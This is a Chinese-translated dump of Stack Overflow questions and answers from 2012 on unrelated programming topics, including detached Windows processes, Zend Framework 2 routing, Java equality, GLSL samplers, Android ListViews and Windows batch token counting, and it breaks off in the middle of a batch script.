我正在开发一个应用程序，其中进程 A 的多个实例依赖于进程 B 的单个实例。想法是进程 A 的一个实例启动进程 B，以便 A 的所有实例都可以用它。A 的实例托管在第 3 方进程中，并且可以在不可预测的时间点被拆除（通过杀死进程树）。因此，进程 B 不是进程 A 的任何实例的子进程至关重要。

我曾尝试使用 PInvoke 调用 CreateProcess，在创建标志中指定 DetachedProcess (0x08)，但这不起作用（请参阅下面的代码）。

```
[DllImport("kernel32.dll")]
private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref StartupInfo lpStartupInfo, out ProcessInformation lpProcessInformation);

public Process LaunchProcess(Path executablePath, string args)
{
    StartupInfo sInfo = new StartupInfo();

    const uint creationFlags = (uint)(CreationFlags.CreateNoWindow | CreationFlags.DetachedProcess);

    ProcessInformation pInfo;
    bool success = CreateProcess(executablePath.ToString(), args, IntPtr.Zero, IntPtr.Zero, false, creationFlags, IntPtr.Zero, executablePath.GetFolderPath().ToString(), ref sInfo, out pInfo);

    if (!success)
    {
        throw new Win32Exception();
    }

    return Process.GetProcessById(pInfo.dwProcessId);
} 
```

我还阅读了[如何创建一个不是其创建过程的子进程的文章？](https://stackoverflow.com/questions/3136154/how-to-create-a-process-that-is-not-a-child-of-its-creating-process)，它建议使用临时进程来启动新进程，但我不喜欢这种方法，因为它会使同步复杂化，以确保只启动进程 B 的单个实例。

有谁知道实现这一目标的更好方法？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-22T08:15:19.037

您可以尝试使用[`ManagementClass`](http://msdn.microsoft.com/en-us/library/system.management.managementclass%28v=vs.100%29.aspx)启动进程并传递一些[`CreateFlags`](http://msdn.microsoft.com/en-us/library/windows/desktop/ms684863%28v=vs.85%29.aspx)，更具体地说，`DETACHED_PROCESS`标志。（您需要参考`System.Management`。）

```
private static void Main()
{
    using (var managementClass = new ManagementClass("Win32_Process"))
    {
        var processInfo = new ManagementClass("Win32_ProcessStartup");
        processInfo.Properties["CreateFlags"].Value = 0x00000008;

        var inParameters = managementClass.GetMethodParameters("Create");
        inParameters["CommandLine"] = "notepad.exe";
        inParameters["ProcessStartupInformation"] = processInfo;

        var result = managementClass.InvokeMethod("Create", inParameters, null);
        if ((result != null) && ((uint)result.Properties["ReturnValue"].Value != 0))
        {
            Console.WriteLine("Process ID: {0}", result.Properties["ProcessId"].Value);
        }
    }

    Console.ReadKey();
} 
```

至少在我的机器记事本上不被视为我的控制台测试应用程序的子进程。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2022-02-03T07:10:12.957

您可以使用进程属性指定不同的父级。这是一个可以做到这一点的函数。尽管它是用 C++ 编写的，但它展示了它的工作原理。

```
bool CreateProcessWithParent(DWORD parentId, PWSTR commandline) {
    auto hProcess = ::OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentId);
    if (!hProcess)
        return false;

    SIZE_T size;
    //
    // call InitializeProcThreadAttributeList twice
    // first, get required size
    //
    ::InitializeProcThreadAttributeList(nullptr, 1, 0, &size);

    //
    // now allocate a buffer with the required size and call again
    //
    auto buffer = std::make_unique<BYTE[]>(size);
    auto attributes = reinterpret_cast<PPROC_THREAD_ATTRIBUTE_LIST>(buffer.get());
    ::InitializeProcThreadAttributeList(attributes, 1, 0, &size);

    //
    // add the parent attribute
    //
    ::UpdateProcThreadAttribute(attributes, 0, 
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, 
        &hProcess, sizeof(hProcess), nullptr, nullptr);

    STARTUPINFOEX si = { sizeof(si) };
    //
    // set the attribute list
    //
    si.lpAttributeList = attributes;
    PROCESS_INFORMATION pi;

    //
    // create the process
    //
    BOOL created = ::CreateProcess(nullptr, commandline, nullptr, nullptr, 
        FALSE, EXTENDED_STARTUPINFO_PRESENT, nullptr, nullptr, 
        (STARTUPINFO*)&si, &pi);

    //
    // cleanup
    //
    ::CloseHandle(hProcess);
    ::DeleteProcThreadAttributeList(attributes);

    return created;
} 
```

源代码取自[https://scorpiosoftware.net/2021/01/10/parent-process-vs-creator-process/](https://scorpiosoftware.net/2021/01/10/parent-process-vs-creator-process/)

# model-view-controller - Zend Framework 2：在视图中获取匹配的路由

> ID：12068648
> 
> 赞同：12
> 
> 时间：2012-08-22T07:56:50.847
> 
> 标签：model-view-controller, routes, zend-framework2

我目前正在通过大致基于骨架应用程序开发一个小型 MVC 应用程序来学习 ZF2。现在我正在尝试根据匹配的路由隐藏一些固定的 HTML 元素：例如，我不希望在登录阶段显示主菜单。

我可以通过将切换参数作为控制器操作的返回值传递来轻松做到这一点，但感觉不对，所以我想从布局中检查匹配的路由并相应地组合布局。

问题是，我不知道如何在模板中获取匹配的路由。这可能吗？是否有其他解决方案可以避免将布局逻辑添加到控制器中？

**经过一些出色的科学怪人工作后进行编辑**，我能够找到解决方案。我喜欢使用帮助器的想法，所以我只是尝试从主模块中的 boostrap 函数将 Application 对象传递给它：

```
$app = $e->getApplication();
$serviceManager = $app->getServiceManager();
....
$serviceManager->get('viewhelpermanager')->setFactory('getRoute', function($sm) use ($app) {
    return new Helper\GetRoute($app);
}); 
```

和辅助功能：

```
use Zend\View\Helper\AbstractHelper;

class GetRoute extends AbstractHelper {
    private $sm;

    public function __construct($app) {
        $this->sm = $app->getServiceManager();
    }

    public function echoRoute() {
        $router = $this->sm->get('router');
        $request = $this->sm->get('request');

        $routeMatch = $router->match($request);
        if (!is_null($routeMatch))
            echo $routeMatch->getMatchedRouteName();
    }
} 
```

也许有一种更清洁、更 ZF2ish 的方式来做到这一点......

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2013-01-11T09:59:19.543

没有新匹配的另一种解决方案

```
$routeMatch = $serviceLocator->get('Application')->getMvcEvent()->getRouteMatch();

echo $routeMatch->getMatchedRouteName(); 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-11-16T20:06:11.797

有一种方法可以在布局中获取服务管理器：

```
$sm = $this->getHelperPluginManager()->getServiceLocator(); 
```

然后你可以访问`$sm->get('router')`等。

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2012-08-24T09:27:04.243

You could create a View helper that implements ServiceManagerAwareInterface. Then inside the View helper using the ServiceManager instance to retrieve both the router and request objects then reconstruct the route match.

```
$services = $this->getServiceManager();

$router = $services->get('router');
$request = $services->get('request');

$routeMatch = $router->match($request);
echo $routeMatch->getMatchedRouteName(); 
```

I'd also recommend writing the View helper so that code only triggers once per request.

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2016-03-31T15:16:38.783

迁移到 ZF3 时，您应该考虑使用此方法……因为 getLocator 不再可用（并且注入它是不正确的）。

1.  创建助手

    ```
    namespace Application\View\Helper;

    use Zend\Http\Request;
    use Zend\Router\RouteStackInterface;
    use Zend\View\Helper\AbstractHelper;

    /**
     * Helper to get the RouteMatch
     */
    class RouteMatch extends AbstractHelper
    {
        /**
         * RouteStackInterface instance.
         *
         * @var RouteStackInterface
         */
        protected $router;

        /**
         * @var Request
         */
        protected $request;

        /**
         * RouteMatch constructor.
         * @param RouteStackInterface $router
         * @param Request $request
         */
        public function __construct(RouteStackInterface $router, Request $request)
        {
            $this->router = $router;
            $this->request = $request;
        }

        /**
         * @return \Zend\Router\RouteMatch
         */
        public function __invoke()
        {
            return $this->router->match($this->request);
        }
    } 
    ```

2.  为这个助手创建一个工厂

    ```
    namespace Application\View\Helper;

    use Interop\Container\ContainerInterface;
    use Zend\ServiceManager\Factory\FactoryInterface;

    class RouteMatchFactory implements FactoryInterface
    {
        public function __invoke(ContainerInterface $container, $requestedName, array $options = null)
        {
            $router = $container->get('router');
            $request = $container->get('request');

            return new RouteMatch($router, $request);
        }

    } 
    ```

3.  致电您的工厂`Module.php`并为其创建别名。

    ```
    public function getViewHelperConfig()
    {
        return array(
            'factories' => array(
                RouteMatch::class => RouteMatchFactory::class,
            ),
            'aliases' => array(
                'routeMatch' => RouteMatch::class,
            )
        );
    } 
    ```

就是这样...您有一个使用新 ZF3 标准的 RouteMatch 助手。

再见！

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-12-24T10:44:38.613

鉴于您可以使用：

```
$this->getHelperPluginManager()->getServiceLocator()->get('request')->getUri()->getPath(); 
```

或者

```
$this->getHelperPluginManager()->getServiceLocator()->get('request')->getUri()->toString(); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-08-22T09:08:46.727

我相信您可以通过查找动作/控制器名称来解决它：

```
$controller = $this->getRequest()->getControllerName();
$action = $this->getRequest()->getActionName(); 
```

一旦你知道了这个动作，你就可以有特定的条件来启用布局的各个部分。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2016-11-09T14:01:18.817

有关在 ZF3 中集成 getRouteMatch 的“Rodrigo Boratto”帖子的其他信息（我无法发表评论，因为我的 repo 不到 50...）

在查看帮助文件这些行：

```
use Zend\Mvc\Router\RouteMatch as MvcRouteMatch;
use Zend\Mvc\Router\RouteStackInterface; 
```

应该：

```
use Zend\Router\RouteMatch as MvcRouteMatch;
use Zend\Router\RouteStackInterface; 
```

我不知道他们是什么时候做出改变的，但文件位于 Zend\Router 命名空间中。

PS如果这很重要，我会使用作曲家。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2016-06-11T18:10:00.747

我认为你可以使用

```
$this->getHelperPluginManager()->getServiceLocator()->get('Application')->getMvcEvent()->getRouteMatch()->getMatchedRouteName(); 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2013-01-30T21:33:23.850

我的控制器：

```
 <?PHP
    namespace SomeName\Controller;

    use Zend\Mvc\Controller\AbstractActionController;
    use Zend\View\Model\ViewModel;

    class SomeController extends AbstractActionController
    {
        public function getIdAction()
        {
            $id = $this->params()->fromRoute('id', 0);
            return new ViewModel(array(
                'id' => $id,
            ));
        }
    } 
```

我的路由器：

```
 <?php
    return array(
        'controllers' => array(
            'invokables' => array(
                'SomeName\Controller\Some' => 'SomeName\Controller\SomeController',
            ),
        ),

        'router' => array(
            'routes' => array(
                'testId' => array(
                    'type'    => 'segment',
                    'options' => array(
                        'route'    => '/[:id]',
                        'constraints' => array(
                            'id' => '\d*',
                        ),
                        'defaults' => array(
                            'controller' => 'SomeName\Controller\Some',
                            'action'     => 'getId',
                        ),
                    ),
                ),
            ),
        ),

        'view_manager' => array(
            'template_path_stack' => array(
                'album' => __DIR__ . '/../view',
            ),
        ),
    ); 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2018-04-26T19:35:26.570

在任何视图或布局中，您都可以使用此功能测试路线：

```
<?php function itsRoute($routeName){
    $flag = false;
    if($this->serverUrl(true) == $this->url($route,[],['force_canonical'=>true]))){
        $flag = true;
    }

    return $flag;
} 
```

# android - Android中的字符串替换

> ID：12068650
> 
> 赞同：0
> 
> 时间：2012-08-22T07:57:01.200
> 
> 标签：android

为了在 Android 中尝试字符串替换，我写了一个小片段：

```
public class cs{
 public static void main(String[] args){
   String a,c;
   int b;
   b=1;
   c="12345";
   a="12345,54321";
   a.replace(c，String.valueOf(b));
   System.out.println(a);
}
} 
```

**预期输出：** 12345,54321 变为 1,54321

**实际输出：** 12345，54321。请帮忙。</p>

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T08:05:45.877

是逗号`.`的`c.String.valueOf(b)`错字，分隔两个参数吗？因为它没有像所说的那样有意义。`replace`接受两个参数，此外，它不会更改执行它的字符串，它只是返回一个新参数，因此您需要获取该返回值并将其重新分配给变量：

```
a = a.replace(c, String.valueOf(b)); 
```

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-08-22T08:04:45.530

如果你期望输出 1,54321 你需要写

a.replace("12345", c.String.valueOf(b));

# java - 如果在数组中找到值，Java返回索引

> ID：12068651
> 
> 赞同：1
> 
> 时间：2012-08-22T07:57:01.410
> 
> 标签：java, arrays, search

我正在尝试在数组中查找一个值，并且我确定该值将只存在一次，因此我正在尝试查找该值并返回存储它的数组的索引，如果未找到则返回 -1 这个是我想要做的：

```
static Integer[] accs = new Integer[20];
 public static int search()
    {
        Integer[] numbers;
        numbers = accs;
        Integer key;
        Scanner sc = new Scanner(System.in);
         System.out.println("Enter the Account Number:");        
         key = sc.nextInt();

        for (Integer index = 0; index < numbers.length; index++)
      {
           if ( numbers[index] == key )
                 return index;  //We found it!!!
      }
     // If we get to the end of the loop, a value has not yet
     // been returned.  We did not find the key in this array.
     return -1;

    } 
```

即使我知道该值存在于数组中，当我运行它时，也没有显示任何内容。我进行了调试，然后我发现 Key 变量没有我输入的值。有什么问题吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-22T08:00:13.457

您的数组正在存储整数，它是一个 java 对象，以测试 Java 对象的相等性，您需要调用[Object.equals](http://docs.oracle.com/javase/6/docs/api/java/lang/Object.html#equals%28java.lang.Object%29)方法而不是`==`.

在您的情况下，我建议您使用数组`int`而不是`Integer`，它在内存、支持方面更轻，`==`并且您没有使用 的任何功能，`Integer`因此您在这里不需要它们。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-22T08:00:26.437

您在检查时检查*身份*`operator==`（两个引用是否指向完全相同的对象？）而不是*相等性*（它们是否彼此相等？）。

您应该使用`int`s（而不是`Integer`s）或更改条件以使用该[`equals()`](http://docs.oracle.com/javase/6/docs/api/java/lang/Integer.html#equals%28java.lang.Object%29)方法。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-22T08:00:09.820

Integer 是一个对象，所以你必须使用 equals 方法。试试 numbers[index].equals(key)。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-22T08:02:01.647

```
java.util.Arrays.asList(accs).indexOf(key) 
```

或者

```
org.apache.commons.lang.ArrayUtils.indexOf(accs, key); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-22T10:15:51.730

使用以下命令捕获用户输入 BufferedReader br = new BufferedReader(new InputStreamReader(System.in));

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-22T08:01:41.787

确保您了解对象相等和对象标识之间的区别。您正在使用“==”来检查您的值是否在数组中 - 这将检查身份，而不是平等。改为使用`numbers[index].equals(key)`。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-08-22T08:16:37.797

在搜索之前，您需要为每个元素设置值。下面的语句仅声明具有 20 个元素的新数组 value = null static Integer[] accs = new Integer[20]; 替换为： static Integer[] accs = new Integer[]{0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15}; 并重新测试。

问候，

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-08-22T08:23:41.063

像这样初始化数组并在main中`static Integer[] accs = {3,5,15,6,4,32,9};`调用 方法。`search()`您的功能正常工作。

# javascript - 这些条款是否相同？

> ID：12068655
> 
> 赞同：0
> 
> 时间：2012-08-22T07:57:10.733
> 
> 标签：javascript

我正在查看我的同事编写的 javascript，我认为它看起来在两个子句中的作用相同：

```
function doSubmitOversikt(action, command, status) {

    var checked = document.getElementById("klarbox").checked;

    if(status && !checked) {

        if (confirm("Ärendet är satt som Klar (formell handläggning första delen klar). Vill du verkligen ångra detta? Att ångra kan innebära att ärendet behöver arras om i CICS.")) {

            document.actionForm.action.value = action;
            document.actionForm.actionCommand.value = command;  
            document.actionForm.submit();
            disableAll();

        }
    } else {

        document.actionForm.action.value = action;
        document.actionForm.actionCommand.value = command;  
        document.actionForm.submit();
        disableAll();
    }

} 
```

上面的代码和无条件地做有什么区别

```
 document.actionForm.action.value = action;
    document.actionForm.actionCommand.value = command;  
    document.actionForm.submit();
    disableAll(); 
```

?

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-22T07:59:48.150

不不一样。如果两者都`status`评估`!checked`为真，但用户不确认。没发生什么事。

但是请注意，这样做违反了[DRY 原则](http://en.wikipedia.org/wiki/Don%27t_repeat_yourself)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T08:00:37.940

第一个循环只有在确认是肯定的情况下才会执行；并且如果未选中复选框并且`status`是真值。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-22T08:03:07.933

我不认为他们的一个条件是如果状态为真并且没有检查然后要求确认，否则什么都不做。如果状态不正确或已检查，则执行。

# opengl - OpenGL sampler2D 作为子程序方法的参数导致错误

> ID：12068657
> 
> 赞同：2
> 
> 时间：2012-08-22T07:57:11.473
> 
> 标签：opengl, glsl

我在 GLSL 片段着色器中有一个子例程方法，它应该输出基于 sampler2D 的像素作为输入参数。程序无法使用此设置进行编译。但是，只要我只输出一种没有 texure2D() 计算的颜色，该方法就可以正常工作。是否有可能无法将 sampler2D 作为参数传递。我正在使用 OpenGL 4.2，GLSL 420

这是代码：

```
#version 420
subroutine vec4 RenderPass(sampler2D tex,vec2 uvsIn);
subroutine uniform RenderPass renderTechnique;
layout(binding=0)  uniform sampler2D colorMap;
smooth in vec2 uvsOut;

 ........ there rest of stuff

subroutine( RenderPass )
vec4 copyPass(sampler2D tex,vec2 uvsIn){

  return texture2D(tex,uvsIn);
  ////this however works ok : return vec4(1,0,0,1);

}

void main()
{

    outputColor = renderTechnique(colorMap,uvsOut);

} 
```

更新：好的，感谢您的提示。我修复了着色器编译日志。现在我收到了这个程序错误：

```
: error C5208: Sampler needs to be a uniform (global or parameter to main), need to inline function or resolve conditional expression 
```

# android - 通过当前行中的复选框启用 ListView 中的下一行

> ID：12068669
> 
> 赞同：0
> 
> 时间：2012-08-22T07:58:06.073
> 
> 标签：android, listview, checkbox, row

我有一个 ListView，每行都有一个 TextView 和一个 Checkbox。我正在尝试创建一个序列，用户必须单击第一行的复选框以启用下一行并删除灰色效果。单击此行中的复选框将对下一行执行相同的操作，依此类推。

这可能吗？如何？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T08:37:45.843

创建自定义`Object`以保持行的状态。例如：

```
class Row {
   private TextView text;
   private CheckBox box;
   private boolean grayedOut;

   //implementation...
} 
```

在您的内部您`Activity`制作一个`ArrayList<Row>()`并将其作为`Adapter`您的`ListView`.

```
onCreate(..){
   mArrayList = new ArrayList<Row>();
   // fill arraylist
   Adapter mAdapter = new CustomAdapter(... , ... , mArrayList);
   ListView lv = findView..
   lv.setAdapter(mAdapter);
} 
```

为`Adapter`您`ListView`定制。您可以按照[此处](http://www.ezzylearning.com/tutorial.aspx?tid=1763429)找到的示例进行操作。在您的情况下，一些调整将如下：

```
public class CustomAdapter extends ArrayAdapter<Row>{

    public CustomAdapter(...) {
        // do stuff
    }

    @Override
    public View getView(int position, View convertView, ViewGroup parent) {
        // ....

        if (item at position has gray state){
             set layout to gray
        } else {
             set layout to active
        }

        // ....
        return row;
    } 
```

现在我们有一个`Listview`, a`CustomAdapter`并且对于列表中的每个项目我们都有一个`Row`提供特定状态的。默认所有状态都将设置为灰色状态，除了第一项。使用`onItemClickedListener`，我们可以解锁其他物品..

```
lv.setOnItemClickListener(new OnItemClickListener(){
    public void onItemClick(AdapterView<?> parent, View v, int position, Long id){        
         // do stuff...
         mArrayList.get(position+1).setGrayedOut(false);
    }
} 
```

祝你好运！

# javascript - 将基于数据的格式添加到 FullCalendar jquery 插件事件

> ID：12068677
> 
> 赞同：2
> 
> 时间：2012-08-22T07:58:37.433
> 
> 标签：javascript, jquery, fullcalendar

我目前正在使用日历来显示志愿服务机会。这些志愿服务机会只有一定数量的名额，因此最终机会将变得充分。当特定机会上没有更多位置时，我希望相应的日历事件更改背景颜色（即位置 == 0）。

我已经更改了我的 PHP 中的 fetch 方法以包含位置数，因此现在可以使用 FullCalendar 插件：

```
{
    title: 'Cal Give Back Test With Space',
    start: new Date(2012, 7, 20),
    url: 'opportunityDetailUsr.php?id=4&gid=153',
    places:15
}, 
```

经过大量摆弄后，我不确定我需要调整哪些区域以实现我想要的改变。如果任何对该插件有更好理解的人可以为我阐明这一点，我们将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T13:06:07.420

`eventRender`我认为您可以使用回调来实现这一点。看看这个小提琴：http: [//jsfiddle.net/100thGear/MpfGX/](http://jsfiddle.net/100thGear/MpfGX/)

让我知道这是否有帮助！

# ruby-on-rails - 如何在 Heroku 上使用 send_file（或 send_data）解决内存泄漏？

> ID：12068680
> 
> 赞同：2
> 
> 时间：2012-08-22T07:58:47.080
> 
> 标签：ruby-on-rails, heroku, mongrel, sendfile, x-sendfile

我有一个 Rails 3 应用程序需要生成图像并将数据发送到浏览器。

该应用程序必须部署在 Heroku 上。

然而，Heroku 只支持通过 Mongrel 进行流式传输，它保留了内存。然后这会导致 Heroku 变慢，然后在十几个请求后终止线程。

[https://devcenter.heroku.com/articles/error-codes#r14-memory-quota-exceeded](https://devcenter.heroku.com/articles/error-codes#r14-memory-quota-exceeded)

我目前正在使用来自 ActionController::DataStreaming 的 send_data 或 send_file

[http://api.rubyonrails.org/classes/ActionController/DataStreaming.html#method-i-send_data](http://api.rubyonrails.org/classes/ActionController/DataStreaming.html#method-i-send_data)

Heroku 不支持 Rack::Sendfile 或 x-sendfile。

[https://devcenter.heroku.com/articles/rack-sendfile](https://devcenter.heroku.com/articles/rack-sendfile)

“ruby-mongrel-x-sendfile”项目说：“通过 mongrel 流式传输大量数据是一件坏事；会引发严重的内存泄漏”并提供“in-mongrel 解决方案”。但这看起来不是一个好的解决方案。

[http://code.google.com/p/ruby-mongrel-x-sendfile/](http://code.google.com/p/ruby-mongrel-x-sendfile/)

一个缓慢的解决方案是先将每个文件上传到 Amazon S3。

请问有人有什么想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-30T02:03:32.943

答案是开始垃圾收集：

```
GC.start 
```

我在发送数据之后将该行放在 Rails 控制器操作的底部。

[http://www.ruby-doc.org/core-1.9.3/GC.html](http://www.ruby-doc.org/core-1.9.3/GC.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2020-10-03T20:37:07.103

答案是绝对*不要*开始垃圾收集。这掩盖了糟糕的实施。您的 Ruby 进程仍然会消耗更多的内存——严格来说——这是必要的。

答案是流式传输响应数据——即将数据逐块读入内存并通过响应主体刷新。这样，为您发送的文件/数据提供服务的最大内存需求仅限于正在流式传输的“页面”的大小。

将二进制数据以块的形式检出[`ActionController::Live`](https://api.rubyonrails.org/classes/ActionController/Live.html)并读取给请求这些图像的客户端。

# python - 将变量作为参数传递

> ID：12068693
> 
> 赞同：-4
> 
> 时间：2012-08-22T07:59:23.567
> 
> 标签：python, linux, shell

我有一个 python 脚本 sms.py，它需要两个参数：

1) 手机号码

2) 一个随机数

随机数由以下方式生成：

`myrandnumber=`expr '(' $RANDOM '*' 30 / 32767 ')' + 1``

我的 sh 脚本如下所示：

```
myrandnumber=`expr '(' $RANDOM '*' 30  / 32767 ')' + 1`

cd /home/janu/programs/

output_filename=output/output-`date +%Y%m%d-%H.%M.%S`.txt
python sms.py -mob 917204785003 --key $myrandnumber > $output_filename 
```

我无法获得 '$myrandnumber' 值。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T08:02:38.273

如果您制作了 sms.py 脚本，则最好在 python 代码中使用随机库：

```
 import random
   key = random.randint(1,3000) # 1 to 3000 inclusive 
```

# matlab - Matlab保存指南输入数据以用于计算

> ID：12068695
> 
> 赞同：0
> 
> 时间：2012-08-22T07:59:27.923
> 
> 标签：matlab

我在使用指南时遇到问题。

我希望用户在指南的编辑框中输入数据。

然后例如我希望 Matlab 将该值保存为`Velocity`

并使用该值来计算许多其他使用它的东西。

我被卡住了是这样的

我使用了assignin函数

```
function edit1_Callback(hObject, eventdata, handles)
  Vel=get(handles.edit1, 'String');
  assignin('base', 'Vel', Vel); 
```

比我在命令行上运行它。

我进去`8`了，它给了我

```
a = 8 
```

所以我输入 `a+4`

比我给我`68`什么的。

我想要 12 作为我的答案。我能做些什么？？

提前谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T09:57:58.380

`a`是您需要先调用的字符/字符串[`str2num`](http://www.mathworks.com/help/techdoc/ref/str2num.html)。

# asp.net-mvc-3 - 将 mvc 3 应用程序发布到 localhost 并连接到 localhost sql server 数据库

> ID：12068696
> 
> 赞同：0
> 
> 时间：2012-08-22T07:59:29.233
> 
> 标签：asp.net-mvc-3, sql-server-2008, entity-framework-4

我已将 mvc 3 应用程序发布到 IIS 7 localhost。我首先使用了 Entity Framework 4 数据库。发布应用程序时，.mdf 文件位于**wwwroot/mvc3applciation的****App_Data**文件夹下。实际上，我如何连接到 localhost sql server 2008 而不是 App_Data 的 .mdf 文件，之后实体框架可以正常工作。我必须配置什么才能将 localhost 数据库服务器连接到与实体框架一起使用的 mvc 3 应用程序。

 *** * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T08:05:40.383

在`<connectionStrings>`您的网络配置设置中，您需要添加一个与您的名称相同的条目`DbContext`并指定数据库服务器和实例，例如：

```
<add name="EFDbContext" connectionString="Data Source=(local);Initial Catalog=database_name;Integrated Security=True;" providerName="System.Data.SqlClient"/> 
```**

# android - Android listview - 侦听器必须覆盖超类方法

> ID：12068697
> 
> 赞同：3
> 
> 时间：2012-08-22T07:59:32.667
> 
> 标签：android, listview

这是代码，我有问题：

```
 listview.setOnItemClickListener(new AdapterView.OnItemClickListener() {

        @Override
        public void onItemClick(AdapterView<?> parent, android.view.View view,
                int position, long id) {

            if(listview.isItemChecked(position)){

            } 

            if(listview.getCheckedItemCount()>1){

            }

        }
    }); 
```

它一直说侦听器必须覆盖超类方法，并且我不能在内部类中调用非最终变量“listview”。那么我应该如何调用 listview.isItemChecked(position) 呢？谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T08:07:50.713

我建议您阅读`final`Java 中的使用。从技术上讲，您可以通过添加关键字`final`before来解决此问题`ListView listview = ...`，所以`final ListView listview = ...`。

`OnItemClick`但是，更好的选择是在您的-method中仅使用传递的 ListView 引用。参数`AdapterView<?> Parent`对应你的ListView，所以可以使用如下代码：

```
listview.setOnItemClickListener(new AdapterView.OnItemClickListener() {

    @Override
    public void onItemClick(AdapterView<?> parent, android.view.View view,
            int position, long id) {

        ListView lv = (ListView) parent;

        if(lv.isItemChecked(position)){
            // ...
        } 

        if(lv.getCheckedItemCount()>1){
            // ...
        }

    }
}); 
```

# windows - 在 Windows Batch 中计数 Var

> ID：12068698
> 
> 赞同：2
> 
> 时间：2012-08-22T07:59:36.253
> 
> 标签：windows, loops, batch-file, count

在我的批处理文件中，我有以下变量：

```
set collection=collection1
set environment=oracleDev
set processChain1=-help,-startimport %environment% %collection% 
```

如您所见，我的流程链包含两个用“，”分隔的字符串。

现在我想计算两个字符串（以后可能超过一个字符串）。我试过了：

```
Set count=0
For %%j in (%%processChain1%%) Do Set /A count+=1
echo %count% 
```

但是有第一个错误。它打印出 1 而不是 2。为什么？

在计算字符串后，我想使用每个参数（来自变量 processChain1 的字符串）启动一个应用程序，我尝试使用：

```
FOR /L %%G IN (1,1,%count%) DO (
     FOR /F "tokens=%count% delims=," %%H IN ("%processChain1%") DO java -jar App.jar %%H
) 
```

这现在不能正常工作，因为计数器是错误的，因为第一个错误。但我认为如果我能解决第一个问题，第二个应该可以正常工作。它是否正确？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T08:38:15.923

据我所知，现在计数为 1，因为该 var 中只有一个字符串，稍后您将进行拆分，但您的令牌计数已设置为 1....

您需要拆分第一个字符串 (delims=,)，然后在第二部分中处理每个结果。

**编辑**：

试试这个...

```
@echo off
set collection=collection1
set environment=oracleDev
set processChain1="-help" "-startimport %environment% %collection%"

Set count=0
For %%j in (%processChain1%) Do Set /A count+=1
echo.Total count: %count%
pause 
```

如您所见，我更改了 var *processChain1*结构以用空格（默认分隔符）分隔值并将每个 var 放在引号中......至少它有效，并为您提供总数。

当然，如果你能以这种方式使用它。

希望能帮助到你。干杯。

如果没有..看看这里，也许有帮助：[批处理文件中的单独标记](https://stackoverflow.com/questions/9385899/separate-tokens-in-batch-file)

祝你好运

* * *

## **EDITED 2**（匹配新信息）

批处理文件：**Metalhead89.bat**

```
@echo off
:: define the vars
set collection=collection1
set environment=oracleDev
:: concatenate the vars with ++
set processChain1=-help -startimport++%environment%++%collection%

:: Get the total count plus, run each token found
Set count=0
For %%j in (%processChain1%) do (
    Set /A count+=1
    set line=%%j
    call :processToken
)
:: This will be printed out, at the end of the loop
echo Total token count: %count%
goto :eof

:processToken
for /f %%f in ("%line%") do (
:: set the command var with your exe file for each token found
    set command=Running command: java -jar app.jar %%f
    call :runTheCommand
)
goto :eof

:runTheCommand
:: now we replace the doble ++ in the var string with space, to treat them as options
    set str=%command%
    set str=%str:++= %
:: finally we do a echo of the command with the option included
    echo %str%
goto :eof 
```

现在，从命令行调用该文件，您将获得：

```
Z:\>call Metalhead89.bat
Running command: java -jar app.jar -help
Running command: java -jar app.jar -startimport oracleDev collection1
Total token count: 2 
```

祝你好运哥们;-)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-23T08:42:57.753

在这里，我将介绍我的解决方案，但 gmo 的解决方案至少和我的一样好。

```
@echo off

rem !!!!!!!!!!!!!!!!!!!!!
rem Set Parameter options
rem !!!!!!!!!!!!!!!!!!!!!

set collection=collection1
set environment=oracleDev

rem !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
rem Set Modules As Parameters
rem Watch out: Each module + his options has to be in quotation marks
rem     Options are separated by comma without whitespaces
rem !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

set helpModul="-help"
set importModul="-startimport,%environment%,%collection%"

rem !!!!!!!!!!!!!!!!!!!!!!!
rem Configure Process Chain
